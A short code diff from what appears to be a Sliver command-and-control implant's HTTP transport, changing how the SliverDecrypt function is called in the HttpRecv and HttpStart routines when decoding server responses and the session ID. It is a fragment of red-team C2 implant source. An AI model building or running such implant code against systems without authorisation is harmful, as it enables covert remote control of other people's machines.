@@ -800,7 +800,7 @@ PENVELOPE HttpRecv
 	}
 
 	pDecodedData = Base64Decode(pResp->pRespData);
-	pPlainText = SliverDecrypt(pConfig, pDecodedData, TRUE);
+	pPlainText = SliverDecrypt(pConfig->pSessionKey, pDecodedData);
 	pResult = UnmarshalEnvelope(pPlainText);
 CLEANUP:
 	FREE(lpUri);
@@ -1009,7 +1009,7 @@ BOOL HttpStart
 
 	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
 	pDecodedResp = Base64Decode(lpRespData);
-	pSessionId = SliverDecrypt(pConfig, pDecodedResp, TRUE);
+	pSessionId = SliverDecrypt(pConfig->pSessionKey, pDecodedResp);
 	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 	pConfig->szSessionID[sizeof(pConfig->szSessionID) - 1] = '\0';
 	dwSetCookieLength = sizeof(wszSetCookie);
